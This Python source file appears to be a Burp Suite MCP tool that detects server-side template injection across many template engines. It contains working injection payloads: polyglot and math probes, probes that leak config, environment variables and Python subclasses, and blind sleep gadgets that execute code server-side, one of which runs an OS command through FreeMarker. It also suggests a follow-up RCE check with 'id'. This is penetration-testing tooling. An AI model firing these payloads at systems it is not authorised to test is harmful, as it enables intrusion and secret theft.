"""test_ssti — native SSTI detection orchestrator.

Modeled on SSTImap (https://github.com/vladko312/SSTImap), the maintained
fork of tplmap. Multi-phase detection that routes every probe through
Burp's HTTP client so each step lands in Logger with a real history_index
— citable as evidence in save_finding.

Phases
------
1. Polyglot — single universal trigger ``${{<%[%'"}}%\`` harvests engine
   error / partial-render signatures. Used as a cheap "is anything here at
   all" gate before spending probes.
2. Distinguisher — math expressions across template syntax families
   ({{7*7}}, ${7*7}, <%=7*7%>, #{7*7}, {7*7}, #set(...), @(...), [[${...}]]),
   plus the Jinja/Twig differentiator {{7*'7'}}. The shape of the reflected
   value narrows the engine to one (Jinja2: '7777777') or a small family
   (FreeMarker / Mako / SpEL / Thymeleaf all share ${7*7}=49).
3. Capability — engine-specific READ-ONLY exposure probes (config dump,
   environment leak, sandbox subclass enumeration, app-context). No RCE
   primitives here — that's confirm_rce's job.
4. Blind (opt-in via ``blind=True``) — engine-native sleep gadget with
   timing-delta detection for cases where output isn't reflected. SOC-loud
   (server actually sleeps), so kept behind an explicit flag.

Output is a single verdict block with the detected engine, capability
matrix, the highest-index logger entry to cite, and the recommended next
step (confirm_rce / save_finding / move on).
"""

from __future__ import annotations

import time
from urllib.parse import quote

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


# ─────────────────────────────────────────────────────────────────────────
# Engine catalog — distilled from SSTImap + our knowledge/ssti*.json files
# ─────────────────────────────────────────────────────────────────────────

_POLYGLOT = "${{<%[%'\"}}%\\"

# Phase-1 error / fingerprint patterns. Order matters — first match wins.
# Keep patterns narrow; broad matches like "Error" false-positive.
_POLYGLOT_HINTS: list[tuple[str, list[str]]] = [
    ("jinja2",     ["jinja2.exceptions", "TemplateSyntaxError", "UndefinedError",
                    "tag name expected"]),
    ("twig",       ["Twig\\Error", "Twig_Error", "Unexpected token", "Twig\\Sandbox"]),
    ("freemarker", ["FreeMarker template error", "freemarker.core.",
                    "ParseException", "freemarker.template"]),
    ("velocity",   ["org.apache.velocity", "ParseErrorException",
                    "Velocity parser"]),
    ("smarty",     ["Smarty error", "Smarty_Compiler", "Smarty:"]),
    ("erb",        ["(erb):", "ERB::SyntaxError", "compile error"]),
    ("mako",       ["mako.exceptions", "SyntaxException", "Mako template"]),
    ("nunjucks",   ["nunjucks", "Template render error", "Line "]),
    ("handlebars", ["Handlebars", "Parse error on line"]),
    ("tornado",    ["tornado.template", "ParseError"]),
    ("thymeleaf",  ["org.thymeleaf", "TemplateInputException"]),
    ("spring_el",  ["SpelEvaluationException", "SpelParseException",
                    "EL1041E", "Expression"]),
    ("liquid",     ["Liquid syntax error", "Liquid::SyntaxError"]),
    ("pug",        ["pug:", "Jade", "unexpected token"]),
]

# Phase-2 math distinguishers. Each tuple = (payload, expected_marker,
# candidate_engines). Engines that share a syntax family ({{...}},
# ${...}, etc.) get narrowed by the capability phase, not here.
_DISTINGUISHERS: list[tuple[str, str, list[str]]] = [
    # Strong distinguishers — single-engine
    ("{{7*'7'}}",       "7777777",  ["jinja2"]),                          # Python str * int
    ("{{7*'7'}}",       "49",       ["twig"]),                            # PHP numeric coerce
    # Family-wide (refined in phase 3)
    ("{{7*7}}",         "49",       ["jinja2", "twig", "nunjucks", "tornado",
                                     "handlebars", "liquid"]),
    ("${7*7}",          "49",       ["freemarker", "mako", "spring_el",
                                     "thymeleaf"]),
    ("<%= 7*7 %>",      "49",       ["erb"]),
    ("#{7*7}",          "49",       ["pug"]),
    ("{7*7}",           "49",       ["smarty"]),
    ("#set($x=7*7)$x",  "49",       ["velocity"]),
    ("@(7*7)",          "49",       ["razor"]),
    ("[[${7*7}]]",      "49",       ["thymeleaf"]),
]

# Phase-3 capability probes — READ-ONLY enumeration. Each tuple =
# (capability_name, payload, marker_substring). marker_substring is what
# we expect to see in the response body to call the capability confirmed.
_CAPABILITIES: dict[str, list[tuple[str, str, str]]] = {
    "jinja2": [
        ("config_leak",     "{{config}}",                                 "Config"),
        ("flask_globals",   "{{request.application.__globals__.keys()}}", "dict_keys"),
        ("sandbox_classes", "{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"),
    ],
    "twig": [
        ("self_env",        "{{_self.env}}",                              "Twig"),
        ("server_dump",     "{{app.request.server.all|join(',')}}",       "HTTP_"),
    ],
    "freemarker": [
        ("data_model",      "<#list .data_model?keys as x>${x},</#list>", ","),
        ("exec_available",  "${\"freemarker.template.utility.Execute\"?new()}", "Execute"),
    ],
    "velocity": [
        ("classtool",       "$class.inspect(\"java.lang.System\").type",  "System"),
    ],
    "smarty": [
        ("version",         "{$smarty.version}",                          "."),
    ],
    "erb": [
        ("constants",       "<%= self.class.constants.first(3) %>",       ":"),
    ],
    "thymeleaf": [
        ("env_leak",        "${T(java.lang.System).getenv()}",            "PATH"),
    ],
    "spring_el": [
        ("env_leak",        "${T(java.lang.System).getenv()}",            "PATH"),
        ("appctx",          "${applicationContext}",                      "applicationContext"),
    ],
    "mako": [
        ("cwd_probe",       "<%import os%>${os.getcwd()}",                "/"),
    ],
    "nunjucks": [
        ("range_constr",    "{{range.constructor(\"return 49\")()}}",     "49"),
    ],
    "handlebars": [
        ("lookup_constr",   "{{this.constructor.constructor('return 49')(this)}}", "49"),
    ],
    "tornado": [
        ("settings",        "{{handler.settings}}",                       "cookie_secret"),
    ],
    "pug": [
        ("env_path",        "#{global.process.env.PATH}",                 "/"),
    ],
    "liquid": [
        ("page_json",       "{{page | json}}",                            "{"),
    ],
    "razor": [
        ("env_var",         "@System.Environment.MachineName",            ""),  # any non-empty
    ],
}

# Phase-4 blind sleep gadgets — payload uses literal __SECS__ which we
# substitute at runtime. Sleep server-side; SOC-loud; opt-in only.
_BLIND_SLEEPS: dict[str, str] = {
    "jinja2":     "{{__import__('time').sleep(__SECS__)}}",
    "tornado":    "{% import time %}{{time.sleep(__SECS__)}}",
    "mako":       "<%import time%>${time.sleep(__SECS__)}",
    "nunjucks":   "{{range.constructor(\"return new Promise(r=>setTimeout(r,__SECS__*1000))\")()}}",
    "smarty":     "{php}sleep(__SECS__){/php}",
    "erb":        "<%= sleep __SECS__ %>",
    "freemarker": "${\"freemarker.template.utility.Execute\"?new()(\"sleep __SECS__\")}",
}


# ─────────────────────────────────────────────────────────────────────────
# HTTP plumbing — single send through Burp's curl proxy
# ─────────────────────────────────────────────────────────────────────────

def _build_request(endpoint: str, parameter: str, method: str, payload: str) -> dict:
    encoded = quote(payload, safe="")
    if method.upper() == "GET":
        sep = "&" if "?" in endpoint else "?"
        return {"method": "GET", "url": f"{endpoint}{sep}{parameter}={encoded}"}
    return {"method": method.upper(), "url": endpoint,
            "data": f"{parameter}={encoded}"}


async def _send(req: dict, session: str) -> dict:
    if session:
        return await client.post("/api/session/request", json={
            "session": session,
            "method": req["method"],
            "path": req["url"],
            "data": req.get("data", ""),
        })
    return await client.post("/api/http/curl", json=req)


def _logger_index(resp: dict) -> int:
    if not isinstance(resp, dict):
        return -1
    return int(resp.get("proxy_index", resp.get("index", resp.get("history_index", -1))))


def _body(resp: dict) -> str:
    if not isinstance(resp, dict):
        return ""
    return (resp.get("response_body") or "")[:50000]


# ─────────────────────────────────────────────────────────────────────────
# Tool
# ─────────────────────────────────────────────────────────────────────────

def register(mcp: FastMCP):

    @mcp.tool()
    async def test_ssti(
        endpoint: str,
        parameter: str,
        method: str = "GET",
        session: str = "",
        blind: bool = False,
        blind_seconds: int = 5,
        engine_hint: str = "",
    ) -> str:
        """SSTImap-style native SSTI detection through Burp.

        Multi-phase: polyglot → math distinguisher → engine-specific
        read-only capability probes → optional blind time-delta. Every
        probe is captured in Logger; the highest logger_index from a
        confirmed phase is the citable evidence anchor.

        Args:
            endpoint: Target URL (with `?param=...` already there for GET,
                or bare URL for POST).
            parameter: Parameter name to inject into.
            method: GET (default) or POST. POST sends `application/x-www-
                form-urlencoded` body.
            session: Burp session name for auth-aware probes (optional).
            blind: Enable Phase 4 time-based blind detection. Server-side
                sleep — SOC-loud — opt-in only.
            blind_seconds: Sleep duration for blind probe (default 5s).
                Clamped to [2, 15].
            engine_hint: Skip Phase 2 narrowing and start at Phase 3 for
                this engine directly. Use only when you already know the
                engine (e.g. from confirm_ssti output).
        """
        secs = max(2, min(15, int(blind_seconds)))
        report: list[str] = [
            f"test_ssti — endpoint={endpoint} parameter={parameter} method={method.upper()}",
            "",
        ]
        evidence_idx = -1
        detected: str | None = None
        confidence = "none"
        capabilities: list[tuple[str, int, bool]] = []  # (cap_name, idx, hit)

        # ── Phase 1: polyglot ────────────────────────────────────────
        report.append("Phase 1 (polyglot):")
        poly_req = _build_request(endpoint, parameter, method, _POLYGLOT)
        poly_resp = await _send(poly_req, session)
        if isinstance(poly_resp, dict) and "error" in poly_resp:
            return f"polyglot probe failed: {poly_resp['error']}"
        poly_idx = _logger_index(poly_resp)
        poly_body = _body(poly_resp)
        poly_status = poly_resp.get("status_code", "?")
        polyglot_hint: str | None = None
        for engine, patterns in _POLYGLOT_HINTS:
            if any(p in poly_body for p in patterns):
                polyglot_hint = engine
                break
        report.append(f"  status={poly_status} idx={poly_idx} "
                      f"hint={polyglot_hint or 'none'}")
        if polyglot_hint:
            evidence_idx = max(evidence_idx, poly_idx)

        # ── Phase 2: distinguisher (skipped if engine_hint provided) ─
        if engine_hint:
            detected = engine_hint.lower().strip()
            confidence = "operator"
            report.append("")
            report.append(f"Phase 2 (math): SKIPPED — engine_hint={detected}")
        else:
            report.append("")
            report.append("Phase 2 (math distinguisher):")
            best: tuple[str, int, list[str]] | None = None  # (payload, idx, engines)
            for payload, marker, engines in _DISTINGUISHERS:
                req = _build_request(endpoint, parameter, method, payload)
                resp = await _send(req, session)
                if isinstance(resp, dict) and "error" in resp:
                    continue
                idx = _logger_index(resp)
                body = _body(resp)
                hit = marker in body
                tag = "MATCH" if hit else "miss"
                report.append(
                    f"  {tag} payload={payload!r:24} marker={marker!r:>10} "
                    f"engines={','.join(engines)} idx={idx}"
                )
                if hit:
                    evidence_idx = max(evidence_idx, idx)
                    # First single-engine match wins; otherwise keep the
                    # narrowest family for capability phase.
                    if len(engines) == 1:
                        detected = engines[0]
                        confidence = "high"
                        best = (payload, idx, engines)
                        break
                    if best is None or len(engines) < len(best[2]):
                        best = (payload, idx, engines)
            if detected is None and best is not None:
                # Multiple candidates — refine with polyglot hint if it
                # narrowed something, else take the first as default and
                # let Phase 3 prove the rest.
                if polyglot_hint and polyglot_hint in best[2]:
                    detected = polyglot_hint
                    confidence = "medium (polyglot+math)"
                else:
                    detected = best[2][0]
                    confidence = f"low (family={','.join(best[2])})"

        if detected is None:
            report.append("")
            report.append("Verdict: NO SSTI detected. Math distinguishers all "
                          "missed. If you suspect SSTI in an output-suppressed "
                          "context, re-run with blind=True.")
            if blind:
                # Phase 4 still runs even when math missed — useful for
                # blind-only cases.
                pass
            else:
                return "\n".join(report)

        # ── Phase 3: capability probes ──────────────────────────────
        if detected:
            report.append("")
            report.append(f"Phase 3 (capabilities, engine={detected}):")
            probes = _CAPABILITIES.get(detected, [])
            if not probes:
                report.append(f"  no capability probes registered for {detected}")
            for cap, payload, marker in probes:
                req = _build_request(endpoint, parameter, method, payload)
                resp = await _send(req, session)
                if isinstance(resp, dict) and "error" in resp:
                    report.append(f"  ERR   {cap:18} {resp['error'][:60]}")
                    continue
                idx = _logger_index(resp)
                body = _body(resp)
                hit = marker in body if marker else len(body) > 0
                capabilities.append((cap, idx, hit))
                tag = "YES" if hit else "no "
                report.append(f"  {tag}  {cap:18} idx={idx} marker={marker!r}")
                if hit:
                    evidence_idx = max(evidence_idx, idx)

        # ── Phase 4: blind (opt-in) ─────────────────────────────────
        blind_verdict: str | None = None
        if blind:
            report.append("")
            engine_for_blind = detected or polyglot_hint
            if engine_for_blind and engine_for_blind in _BLIND_SLEEPS:
                gadget = _BLIND_SLEEPS[engine_for_blind].replace("__SECS__", str(secs))
                # Baseline
                base_req = _build_request(endpoint, parameter, method, "x")
                t0 = time.monotonic()
                base_resp = await _send(base_req, session)
                base_ms = int((time.monotonic() - t0) * 1000)
                base_idx = _logger_index(base_resp) if isinstance(base_resp, dict) else -1
                # Sleep probe
                sleep_req = _build_request(endpoint, parameter, method, gadget)
                t0 = time.monotonic()
                sleep_resp = await _send(sleep_req, session)
                sleep_ms = int((time.monotonic() - t0) * 1000)
                sleep_idx = _logger_index(sleep_resp) if isinstance(sleep_resp, dict) else -1
                delta_ms = sleep_ms - base_ms
                expected_ms = secs * 1000
                # Consider it a hit if the delta is at least 70% of the
                # requested sleep duration — tolerates jitter.
                hit = delta_ms >= int(expected_ms * 0.7)
                report.append(
                    f"Phase 4 (blind, engine={engine_for_blind}, sleep={secs}s):"
                )
                report.append(
                    f"  baseline {base_ms}ms (idx={base_idx})  "
                    f"sleep {sleep_ms}ms (idx={sleep_idx})  "
                    f"delta {delta_ms}ms  expected≥{int(expected_ms*0.7)}ms"
                )
                report.append(f"  result: {'TIMING HIT' if hit else 'no delta'}")
                if hit:
                    blind_verdict = engine_for_blind
                    evidence_idx = max(evidence_idx, sleep_idx)
                    if detected is None:
                        detected = engine_for_blind
                        confidence = "blind (timing only)"
            else:
                report.append(f"Phase 4 (blind): no sleep gadget for engine="
                              f"{engine_for_blind or 'unknown'} — skipped")

        # ── Verdict ─────────────────────────────────────────────────
        report.append("")
        if detected and (any(h for _, _, h in capabilities) or blind_verdict):
            confirmed_caps = [c for c, _, h in capabilities if h]
            report.append(
                f"Verdict: SSTI CONFIRMED — engine={detected} "
                f"(confidence={confidence})"
            )
            if confirmed_caps:
                report.append(f"  capabilities: {', '.join(confirmed_caps)}")
            if blind_verdict:
                report.append(f"  blind: timing hit on {blind_verdict}")
            report.append(f"  evidence anchor: logger_index={evidence_idx}")
            report.append("")
            report.append("Next steps:")
            report.append(
                f"  - confirm_ssti(endpoint={endpoint!r}, parameter={parameter!r}, "
                f"engine={detected!r})  # math reflection sanity check"
            )
            report.append(
                f"  - confirm_rce(endpoint={endpoint!r}, parameter={parameter!r}, "
                f"command='id')           # only if engine allows OS exec"
            )
            report.append(
                f"  - assess_finding(vuln_type='ssti', logger_index={evidence_idx}, "
                f"evidence='test_ssti engine={detected} caps={','.join(confirmed_caps) or 'reflection'}')"
            )
        elif detected:
            report.append(
                f"Verdict: REFLECTION ONLY — engine={detected} "
                f"(confidence={confidence}) but no capability probe confirmed."
            )
            report.append("  Treat as suspected, not confirmed. Re-run with blind=True "
                          "if output is suppressed, or move on if reflection alone "
                          "(no exploit primitive) doesn't qualify for the program.")
        else:
            report.append("Verdict: NO SSTI — math/blind all negative.")

        return "\n".join(report)
